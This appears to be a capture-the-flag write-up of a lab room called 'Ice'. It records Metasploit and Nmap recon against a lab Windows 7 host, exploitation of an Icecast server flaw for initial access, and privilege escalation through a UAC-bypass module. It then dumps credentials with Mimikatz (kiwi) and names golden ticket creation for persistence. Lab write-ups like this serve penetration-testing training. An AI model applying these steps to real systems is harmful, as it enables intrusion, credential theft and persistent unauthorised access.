@@ -1,0 +1,205 @@
+
+Ice 
+
+
+
+attempting to do this with only metasploit  
+
+
+RECON
+
+
+
+
+msf6 > workspace iceRoom
+[*] Workspace: iceRoom
+msf6 > hosts
+
+Hosts
+=====
+
+address       mac  name  os_name    os_flavor  os_sp  purpose  info  comments
+-------       ---  ----  -------    ---------  -----  -------  ----  --------
+10.10.36.234             Windows 7                    client         
+
+msf6 > services
+Services
+========
+
+host          port   proto  name          state  info
+----          ----   -----  ----          -----  ----
+10.10.36.234  135    tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
+10.10.36.234  445    tcp    microsoft-ds  open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP
+10.10.36.234  3389   tcp    tcpwrapped    open   
+10.10.36.234  5357   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+10.10.36.234  8000   tcp    http          open   Icecast streaming media server
+10.10.36.234  49152  tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  49153  tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  49154  tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  49158  tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  49159  tcp    msrpc         open   Microsoft Windows RPC
+10.10.36.234  49160  tcp    msrpc         open   Microsoft Windows RPC
+
+msf6 > vulns
+
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+
+
+msf6 > nmap -sV -A -O 10.10.36.234 -oN nmap1
+[*] exec: nmap -sV -A -O 10.10.36.234 -oN nmap1
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 11:31 EST
+Nmap scan report for 10.10.36.234
+Host is up (0.11s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=Dark-PC
+| Not valid before: 2021-02-25T15:15:04
+|_Not valid after:  2021-08-27T15:15:04
+|_ssl-date: 2021-02-26T16:33:04+00:00; 0s from scanner time.
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8000/tcp  open  http          Icecast streaming media server
+|_http-title: Site doesn't have a title (text/html).
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49159/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/26%OT=135%CT=1%CU=40092%PV=Y%DS=2%DC=T%G=Y%TM=603922
+OS:C0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
+OS:=7)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%TS=7)OPS(O1=M506NW8ST11%O2=M506NW8
+OS:ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)WIN(W1=20
+OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
+OS:06NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
+OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
+OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h30m00s, deviation: 3h00m01s, median: 0s
+|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:c9:17:ac:8a:05 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Dark-PC
+|   NetBIOS computer name: DARK-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-02-26T10:32:59-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-26T16:32:59
+|_  start_date: 2021-02-26T15:15:03
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   111.12 ms 10.9.0.1
+2   109.00 ms 10.10.36.234
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.89 seconds
+
+
+
+
+ACCESS 
+
+
+
+https://www.cvedetails.com/
+
+cool site if you are making report,, had a hard time navigating it,,, 
+
+
+cve-2004-1561
+
+search icecast 
+
+exploit/windows/http/icecast_header
+
+run post/multi/recon/local_exploit_suggester
+
+we get a huge lisst,,,, we select the first one 
+
+we run the exploit and get initial access,
+
+
+
+ESCALATE 
+
+
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.36.234 - Collecting local exploits for x86/windows...
+[*] 10.10.36.234 - 37 exploit checks are being tried...
+[+] 10.10.36.234 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.36.234 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+
+
+background and use exploit/windows/local/bypassuac_eventvwr
+
+show options , set them , run ,, should create a new session, it it doesn't reset box, 
+
+
+run command getprivs to see new elevated privilages
+
+run ps to migrate to spoolsv.exe , getuid to verify we are system,,
+
+now that we are system we can launch load kiwi,
+
+
+kiwi has a lot of awesome commands, like webcam , rdp , creds_all to name a few, 
+
+
+POST 
+
+Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos 
+(the authentication system in Windows domains), the ticket-granting ticket. 
+In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+
+
+golden_ticket_create
+
+
+
+
+
+
+
+
+
+
